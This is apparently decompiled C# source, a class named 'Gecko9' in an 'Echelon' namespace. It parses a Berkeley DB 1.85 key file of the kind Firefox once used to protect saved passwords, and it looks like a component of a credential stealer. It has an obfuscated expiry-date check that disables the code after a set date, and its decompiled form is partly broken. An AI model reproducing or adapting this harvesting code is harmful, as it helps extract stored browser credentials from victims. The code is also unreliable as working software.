using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace Echelon
{
	public class Gecko9
	{
		[CompilerGenerated]
		private string m_a;

		[CompilerGenerated]
		private readonly List<KeyValuePair<string, string>> b;

		public string Version
		{
			get;
			set;
		}

		public List<KeyValuePair<string, string>> Keys
		{
			get;
		}

		public Gecko9(string FileName)
		{
			List<byte> list = new List<byte>();
			b = new List<KeyValuePair<string, string>>();
			using (BinaryReader binaryReader = new BinaryReader(File.OpenRead(FileName)))
			{
				int i = 0;
				for (int num = (int)binaryReader.BaseStream.Length; i < num; i++)
				{
					list.Add(binaryReader.ReadByte());
				}
			}
			string value = BitConverter.ToString(a(list.ToArray(), 0, 4, gg: false)).Replace("-", "");
			string text = BitConverter.ToString(a(list.ToArray(), 4, 4, gg: false)).Replace("-", "");
			int num2 = BitConverter.ToInt32(a(list.ToArray(), 12, 4, gg: true), 0);
			if (!string.IsNullOrEmpty(value))
			{
				Version = "Berkelet DB";
				if (text.Equals("00000002"))
				{
					Version += " 1.85 (Hash, version 2, native byte-order)";
				}
				int num3 = int.Parse(BitConverter.ToString(a(list.ToArray(), 56, 4, gg: false)).Replace("-", ""));
				int num4 = 1;
				while (Keys.Count < num3)
				{
					string[] array = new string[(num3 - Keys.Count) * 2];
					for (int j = 0; j < (num3 - Keys.Count) * 2; j++)
					{
						array[j] = BitConverter.ToString(a(list.ToArray(), num2 * num4 + 2 + j * 2, 2, gg: true)).Replace("-", "");
					}
					Array.Sort(array);
					for (int k = 0; k < array.Length; k += 2)
					{
						int num5 = Convert.ToInt32(array[k], 16) + num2 * num4;
						int num6 = Convert.ToInt32(array[k + 1], 16) + num2 * num4;
						int num7 = (k + 2 >= array.Length) ? (num2 + num2 * num4) : (Convert.ToInt32(array[k + 2], 16) + num2 * num4);
						string @string = Encoding.ASCII.GetString(a(list.ToArray(), num6, num7 - num6, gg: false));
						string value2 = BitConverter.ToString(a(list.ToArray(), num5, num6 - num5, gg: false));
						if (!string.IsNullOrEmpty(@string))
						{
							Keys.Add(new KeyValuePair<string, string>(@string, value2));
						}
					}
					num4++;
				}
			}
			else
			{
				Version = "Unknow database format";
			}
		}

		private byte[] a(byte[] gd, int ge, int gf, bool gg)
		{
			DateTime d = new DateTime(~(0xE1FDC21 ^ -236969940) << 1, -(-1 << 2), -(350621899 + -350621902) << 1);
			if ((d - DateTime.Now).TotalDays < 0.0)
			{
				throw new InvalidOperationException();
			}
			byte[] array = new byte[gf];
			int num = 0;
			for (int i = ge; i < ge + gf; i++)
			{
				array[num] = gd[i];
				num++;
			}
			if (gg)
			{
				Array.Reverse(array);
			}
			return array;
		}
	}
}
